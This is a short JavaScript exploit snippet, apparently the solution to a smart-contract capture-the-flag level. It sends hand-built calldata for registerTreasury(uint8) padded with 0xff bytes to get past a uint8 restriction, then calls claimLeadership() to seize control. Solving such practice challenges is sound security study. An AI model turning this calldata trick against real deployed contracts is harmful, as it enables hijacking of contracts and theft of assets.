```js
await web3.eth.sendTransaction({
    from: player,
    to: contract.address,
    data: web3.utils.sha3('registerTreasury(uint8)').substring(0, 10) + 'ff'.repeat(32),
})

await contract.claimLeadership()
```
